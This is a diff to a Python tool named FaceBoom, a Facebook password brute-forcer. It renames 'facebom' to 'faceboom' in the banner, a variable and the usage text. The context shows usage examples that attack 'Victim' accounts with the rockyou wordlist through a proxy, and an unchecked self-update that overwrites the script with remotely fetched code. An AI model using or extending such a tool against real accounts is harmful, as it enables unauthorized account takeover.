@@ -126,7 +126,7 @@ class FaceBoom(object):
         proxystatus =wi+"["+gr+"ON"+wi+"]" if self.useProxy  else yl+"["+rd+"OFF"+yl+"]"
         print(gr+"""
 ==================================
-[---]        """+wi+"""Facebom"""+gr+"""         [---]
+[---]        """+wi+"""faceboom"""+gr+"""         [---]
 ==================================
 [---]  """+wi+"""BruteForce Facebook  """+gr+""" [---]
 ==================================
@@ -155,8 +155,8 @@ class FaceBoom(object):
                 print("  [+] An update has been found ::: Updating... ")
                 conn.request("GET", "/Oseid/FaceBoom/master/faceboom.py")
                 newCode = conn.getresponse().read().strip().decode()
-                with open("faceboom.py", "w") as  facebomScript:
-                   facebomScript.write(newCode)
+                with open("faceboom.py", "w") as  faceboomScript:
+                   faceboomScript.write(newCode)
                 with open("core"+os.sep+"version.txt", "w") as ver:
                      ver.write(repoVersion)
                 write("  [+] Successfully updated :)\n")
@@ -222,7 +222,7 @@ class FaceBoom(object):
             sys.exit(1)
 
 parse = optparse.OptionParser(wi+"""
-Usage: python ./facebom.py [OPTIONS...]
+Usage: python ./faceboom.py [OPTIONS...]
 -------------
 OPTIONS:
        |
@@ -242,15 +242,15 @@ OPTIONS:
 Examples:
         |
      |--------
-     | python facebom.py -t Victim@gmail.com -w /usr/share/wordlists/rockyou.txt
+     | python faceboom.py -t Victim@gmail.com -w /usr/share/wordlists/rockyou.txt
      |--------
-     | python Facebom.py -t 100001013078780 -w C:\\Users\\Me\\Desktop\\wordlist.txt
+     | python faceboom.py -t 100001013078780 -w C:\\Users\\Me\\Desktop\\wordlist.txt
      |--------
-     | python facebom.py -t Victim@hotmail.com -w D:\\wordlist.txt -p 144.217.101.245:3129
+     | python faceboom.py -t Victim@hotmail.com -w D:\\wordlist.txt -p 144.217.101.245:3129
      |--------
-     | python facebom.py -t Victim@gmail.com -s 1234567
+     | python faceboom.py -t Victim@gmail.com -s 1234567
      |--------
-     | python facebom.py -g https://www.facebook.com/Victim_Profile
+     | python faceboom.py -g https://www.facebook.com/Victim_Profile
      |--------
 """)
 
